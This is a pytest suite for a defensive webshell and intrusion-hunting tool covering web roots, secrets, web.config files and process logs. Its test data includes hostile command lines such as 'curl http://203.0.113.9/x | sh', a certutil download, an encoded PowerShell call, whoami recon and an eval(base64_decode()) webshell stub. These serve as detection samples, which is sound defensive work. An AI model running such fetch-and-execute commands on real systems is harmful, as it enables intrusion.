from __future__ import annotations

import json
import os
import time
from pathlib import Path

import pytest

import webroot_fixture as wf
from iisguard import cli, fim, process, webshell
from iisguard.audit import secrets, webconfig


@pytest.fixture(scope="module")
def webroot(tmp_path_factory: pytest.TempPathFactory) -> Path:
    root = tmp_path_factory.mktemp("webroot")
    wf.build(root, include_recent_only=True)
    return root


def rel(findings: list[webshell.HuntFinding], root: Path) -> dict[str, webshell.HuntFinding]:
    return {Path(f.path).relative_to(root).as_posix(): f for f in findings}


# ------------------------------------------------------------------ file hunter
def test_every_planted_marker_is_found(webroot: Path) -> None:
    found = rel(webshell.hunt([str(webroot)]), webroot)
    for path in wf.PLANTED:
        assert path in found, f"missed planted file {path}"
        assert found[path].score >= 40 and found[path].sha256


def test_no_clean_file_is_flagged(webroot: Path) -> None:
    found = rel(webshell.hunt([str(webroot)]), webroot)
    flagged_clean = sorted(set(found) & set(wf.CLEAN))
    assert flagged_clean == [], f"false positives: {flagged_clean}"


def test_recent_layouts_aspx_only_with_since(webroot: Path) -> None:
    key = next(iter(wf.RECENT_ONLY))
    assert key not in rel(webshell.hunt([str(webroot)]), webroot)
    assert key in rel(webshell.hunt([str(webroot)], since_days=7), webroot)
    old = webroot / key
    os.utime(old, (time.time() - 90 * 86400,) * 2)
    assert key not in rel(webshell.hunt([str(webroot)], since_days=7), webroot)
    os.utime(old, None)


@pytest.mark.parametrize(
    ("path", "reason"),
    [
        ("wp-content/uploads/2026/11/img-cache.php", "eval() of a decoded string"),
        ("app/UpdateChecker.aspx", "in-memory loader"),
        ("images/banner.png", "script code inside a non-script"),
        ("site1/.user.ini", "auto_prepend_file"),
        ("images/logo.png.aspx", "disguised"),
        ("exchange/owa/auth/IISGUARDTEST.aspx", "/owa/auth/"),
        ("jsp/cmd.jsp", "request input reaches Runtime.exec"),
        ("lib/cache.php", "request input called as a function"),
        ("uploads/web.config", "handler mapping"),
        ("uploads/.htaccess", "handler mapping"),
    ],
)
def test_reason_for_each_marker(webroot: Path, path: str, reason: str) -> None:
    f = rel(webshell.hunt([str(webroot)]), webroot)[path]
    assert any(reason in r for r in f.reasons), f.reasons


def test_severity_levels(webroot: Path) -> None:
    found = rel(webshell.hunt([str(webroot)]), webroot)
    assert found["wp-content/uploads/2026/11/img-cache.php"].severity == "critical"
    assert webshell.severity_for(45) == "medium" and webshell.severity_for(75) == "high"


def test_silence_is_golden_stub_in_uploads_not_flagged(tmp_path: Path) -> None:
    p = tmp_path / "wp-content" / "uploads" / "index.php"
    p.parent.mkdir(parents=True)
    p.write_text("<?php\n// Silence is golden.\n")
    assert webshell.hunt([str(tmp_path)]) == []


def test_symlinks_not_followed(tmp_path: Path) -> None:
    real = tmp_path / "real.php"
    real.write_text('<?php /* x */ eval(base64_decode("SUlTR1VBUkQ=")); ?>')
    link = tmp_path / "link.php"
    try:
        link.symlink_to(real)
    except (OSError, NotImplementedError):
        pytest.skip("symlinks unavailable")
    paths = {Path(f.path).name for f in webshell.hunt([str(tmp_path)])}
    assert paths == {"real.php"}


def test_entropy_helper() -> None:
    assert webshell.shannon_entropy("aaaa") == 0.0
    assert webshell.shannon_entropy("abcdefgh" * 10) == pytest.approx(3.0)


def test_cli_hunt_json(webroot: Path, capsys: pytest.CaptureFixture[str]) -> None:
    rc = cli.main(["hunt", str(webroot), "--checks", "files", "--output-format", "json", "--fail-on", "high"])
    data = json.loads(capsys.readouterr().out)
    assert rc == 1 and len(data["files"]) >= len(wf.PLANTED)


def test_cli_hunt_needs_path(capsys: pytest.CaptureFixture[str]) -> None:
    assert cli.main(["hunt"]) == 2
    assert cli.main(["hunt", ".", "--checks", "bogus"]) == 2


# ------------------------------------------------------------------ FIM
def test_fim_detects_add_modify_delete(tmp_path: Path) -> None:
    site = tmp_path / "site"
    wf.write(
        site, {"index.php": b"<?php echo 1;", "a.php": b"<?php echo 2;", "keep.php": b"<?php echo 3;", "pic.jpg": b"x"}
    )
    base = tmp_path / "base.json"
    assert fim.init_baseline(str(site), str(base)) == 3  # jpg not hashed by default
    assert not fim.check_baseline(str(site), str(base)).changed
    (site / "index.php").write_text("<?php echo 'changed';")
    (site / "a.php").unlink()
    (site / "uploads").mkdir()
    (site / "uploads" / "evil.php").write_text("<?php echo 4;")
    (site / "pic.jpg").write_text("changed but not watched")
    res = fim.check_baseline(str(site), str(base))
    assert [m["path"] for m in res.modified] == ["index.php"]
    assert res.deleted == ["a.php"]
    assert res.added[0]["path"] == "uploads/evil.php" and res.added[0]["suspicious"] is True


def test_fim_cli(tmp_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
    site = tmp_path / "s"
    wf.write(site, {"x.php": b"<?php 1;"})
    b = str(tmp_path / "b.json")
    assert cli.main(["fim", "init", str(site), "--baseline", b]) == 0
    assert cli.main(["fim", "check", str(site), "--baseline", b, "--fail-on-change"]) == 0
    (site / "x.php").write_text("<?php 2;")
    assert cli.main(["fim", "check", str(site), "--baseline", b, "--fail-on-change"]) == 1
    assert cli.main(["fim", "check", str(site), "--baseline", str(tmp_path / "missing.json")]) == 2


# ------------------------------------------------------------------ secrets
@pytest.fixture(scope="module")
def sroot(tmp_path_factory: pytest.TempPathFactory) -> Path:
    root = tmp_path_factory.mktemp("secrets")
    wf.write(root, wf.secrets_files())
    wf.build(root)
    return root


def test_secrets_found_and_masked(sroot: Path) -> None:
    found = secrets.scan_webroot([str(sroot)])
    ids = {f.id for f in found}
    assert {"anthropic-key", "openai-key", "aws-access-key-id", "stripe-live-key"} <= ids
    assert {"git-directory", "WordPress-config-backup", "ASP.NET-Core-settings-file-in-web-tree"} <= ids
    blob = json.dumps([f.to_dict() for f in found])
    for secret_core in ("A" * 20, "B" * 20, "C" * 20, "IOSFODNN7EXAMPLE", "Sup3rS3cretPw", "hunter2hunter2"):
        assert secret_core not in blob, "a secret value leaked into output"
    assert any("sk-a***[" in f.detail for f in found)


def test_secret_in_server_side_code_is_downgraded(sroot: Path) -> None:
    all_ = secrets.scan_webroot([str(sroot)], include_low=True)
    php = [f for f in all_ if f.rel == "secrets/src/config.php"]
    assert php and all(f.severity == "low" for f in php)
    js = [f for f in all_ if f.rel == "secrets/js/app.js"]
    assert js and js[0].severity == "critical"  # client-side file is served raw


def test_env_example_and_clean_files_not_flagged(sroot: Path) -> None:
    found = secrets.scan_webroot([str(sroot)], include_low=True)
    assert not [f for f in found if f.rel == "secrets/.env.example"]
    assert not [f for f in found if f.rel in wf.CLEAN]


def test_reachability_requires_confirmed_owner(sroot: Path) -> None:
    found = secrets.scan_webroot([str(sroot)])
    calls: list[str] = []

    def fake(url: str) -> int:
        calls.append(url)
        return 200 if url.endswith("/.env") else 404

    with pytest.raises(ValueError, match="refusing"):
        secrets.check_reachable(found, "https://example.com", "other.org", fake)
    assert calls == []
    n = secrets.check_reachable(found, "https://example.com/", "EXAMPLE.com", fake, delay=0, sleep=lambda s: None)
    assert n == len(calls) > 0 and n <= secrets.MAX_URL_CHECKS
    assert any(f.rel == "secrets/.env" and f.reachable is True for f in found)
    assert all(u.startswith("https://example.com/") for u in calls)


def test_cli_url_needs_confirm_owner(sroot: Path, capsys: pytest.CaptureFixture[str]) -> None:
    assert cli.main(["hunt", str(sroot), "--checks", "secrets", "--url", "https://example.com"]) == 2
    assert "confirm-owner" in capsys.readouterr().err
    assert cli.main(["hunt", str(sroot), "--checks", "secrets", "--url", "https://example.com",
                     "--confirm-owner", "someone-else.org"]) == 2  # fmt: skip


# ------------------------------------------------------------------ web.config
def test_machinekey_shared_hardcoded_and_dangerous_settings(tmp_path: Path) -> None:
    wf.write(tmp_path, wf.webconfig_files())
    res = webconfig.audit_roots([str(tmp_path)])
    by_id: dict[str, list[webconfig.ConfigFinding]] = {}
    for f in res.findings:
        by_id.setdefault(f.id, []).append(f)
    shared = {Path(f.path).parent.name for f in by_id["machinekey-shared"]}
    assert shared == {"siteA", "siteB"}
    hard = {Path(f.path).parent.name for f in by_id["machinekey-hardcoded"]}
    assert hard == {"siteA", "siteB", "siteC"}
    assert Path(by_id["viewstate-mac-disabled"][0].path).parent.name == "siteD"
    assert by_id["viewstate-mac-disabled"][0].severity == "critical"
    assert "debug-enabled" in by_id and "custom-errors-off" in by_id
    assert not [f for f in res.findings if "siteE" in f.path and f.severity != "low"]
    assert len({f.key_fingerprint for f in by_id["machinekey-shared"]}) == 1
    blob = json.dumps([f.to_dict() for f in res.findings])
    assert wf.KEY_A not in blob and wf.KEY_B not in blob  # keys never printed


def test_webconfig_rejects_entities(tmp_path: Path) -> None:
    (tmp_path / "web.config").write_text('<!DOCTYPE x [<!ENTITY a "b">]><configuration/>')
    res = webconfig.audit_roots([str(tmp_path)])
    assert res.findings == [] and len(res.skipped) == 1


def test_cli_hunt_all_checks(tmp_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
    wf.build(tmp_path)
    wf.write(tmp_path, wf.secrets_files())
    wf.write(tmp_path, wf.webconfig_files())
    rc = cli.main(["hunt", str(tmp_path), "--fail-on", "critical"])
    out = capsys.readouterr().out
    assert rc == 1
    assert "Suspicious files" in out and "Secrets / exposed files" in out and "web.config audit" in out
    assert "A" * 20 not in out


# ------------------------------------------------------------------ processes
def _evt4688(parent: str, child: str, cmd: str) -> str:
    return (
        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System>'
        '<Provider Name="Microsoft-Windows-Security-Auditing"/><EventID>4688</EventID>'
        '<TimeCreated SystemTime="2026-11-07T10:00:00.1234567Z"/></System><EventData>'
        f'<Data Name="SubjectUserName">IIS APPPOOL\\site</Data><Data Name="NewProcessId">0x1a4</Data>'
        f'<Data Name="NewProcessName">{child}</Data><Data Name="ProcessId">0x2b0</Data>'
        f'<Data Name="CommandLine">{cmd}</Data><Data Name="ParentProcessName">{parent}</Data></EventData></Event>'
    )


def _sysmon1(parent: str, child: str, cmd: str) -> str:
    return (
        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System>'
        '<Provider Name="Microsoft-Windows-Sysmon"/><EventID>1</EventID>'
        '<TimeCreated SystemTime="2026-11-07T10:01:00.000Z"/></System><EventData>'
        f'<Data Name="Image">{child}</Data><Data Name="ParentImage">{parent}</Data>'
        f'<Data Name="CommandLine">{cmd}</Data><Data Name="User">IIS APPPOOL\\site</Data>'
        '<Data Name="ProcessId">100</Data><Data Name="ParentProcessId">200</Data></EventData></Event>'
    )


W3WP = r"C:\Windows\System32\inetsrv\w3wp.exe"
SYS = r"C:\Windows\System32"


def test_windows_event_xml_detection() -> None:
    xml = "\n".join([
        _evt4688(W3WP, SYS + r"\cmd.exe", "cmd.exe /c whoami"),
        _evt4688(r"C:\php\php-cgi.exe", SYS + r"\WindowsPowerShell\v1.0\powershell.exe", "powershell -enc AAAA"),
        _evt4688(r"C:\Windows\explorer.exe", SYS + r"\cmd.exe", "cmd.exe"),  # admin at a desktop: clean
        _evt4688(W3WP, SYS + r"\conhost.exe", "conhost.exe 0xffffffff"),  # not a shell: clean
        _sysmon1(W3WP, SYS + r"\whoami.exe", "whoami /all"),
        _sysmon1(W3WP, SYS + r"\certutil.exe", "certutil -urlcache -f http://h/x.bin x.bin"),
    ])  # fmt: skip
    events = process.parse_event_xml(xml)
    assert len(events) == 6 and {e.source for e in events} == {"security-4688", "sysmon-1"}
    assert events[0].pid == 0x1A4 and events[0].ts > 0
    found = process.detect(events)
    assert [(f.rule, f.child) for f in found] == [
        ("web-worker-download-or-encoded", "powershell.exe"),
        ("web-worker-download-or-encoded", "certutil.exe"),
        ("web-worker-spawned-shell", "cmd.exe"),
        ("web-worker-spawned-recon", "whoami.exe"),
    ]
    assert found[0].severity == "critical"


def test_event_xml_with_doctype_rejected() -> None:
    with pytest.raises(ValueError):
        process.parse_event_xml("<!DOCTYPE x [<!ENTITY a 'b'>]><Event/>")


def test_linux_ps_tree() -> None:
    ps = (
        "  100     1 root     php-fpm: master process (/etc/php/8.3/fpm/php-fpm.conf)\n"
        "  200   100 www-data php-fpm: pool www\n"
        "  300   200 www-data sh -c curl http://203.0.113.9/x | sh\n"
        "  400   200 www-data sh -c /usr/sbin/sendmail -t -i\n"
        "  500     1 root     /usr/sbin/cron -f\n"
        "  600   500 root     bash /root/backup.sh\n"
    )
    found = process.detect(process.parse_ps(ps))
    assert [(f.rule, f.child) for f in found] == [("web-worker-download-or-encoded", "sh")]


def test_auditd_parser() -> None:
    lines = [
        'type=SYSCALL msg=audit(1.1:1): arch=c000003e syscall=59 success=yes pid=200 ppid=1 auid=33 comm="php-fpm" exe="/usr/sbin/php-fpm8.3"',
        'type=SYSCALL msg=audit(1.2:2): arch=c000003e syscall=59 success=yes pid=300 ppid=200 auid=33 comm="sh" exe="/usr/bin/dash"',
    ]
    found = process.detect(process.parse_auditd(lines))
    assert len(found) == 1 and found[0].parent.startswith("php-fpm") and found[0].source == "auditd"


def test_windows_cim_json() -> None:
    rows = [
        {"ProcessId": 10, "ParentProcessId": 1, "Name": "w3wp.exe", "CommandLine": "w3wp.exe -ap site"},
        {"ProcessId": 11, "ParentProcessId": 10, "Name": "cmd.exe", "CommandLine": "cmd /c dir"},
    ]
    found = process.detect(process.parse_cim_json(json.dumps(rows)))
    assert len(found) == 1 and found[0].rule == "web-worker-spawned-shell"


def test_cli_hunt_events_file(tmp_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
    f = tmp_path / "events.xml"
    f.write_text(_evt4688(W3WP, SYS + r"\cmd.exe", "cmd.exe /c whoami"))
    rc = cli.main(["hunt", "--checks", "", "--events", str(f), "--output-format", "json", "--fail-on", "high"])
    data = json.loads(capsys.readouterr().out)
    assert rc == 1 and any(x["child"] == "cmd.exe" for x in data["processes"]["findings"])
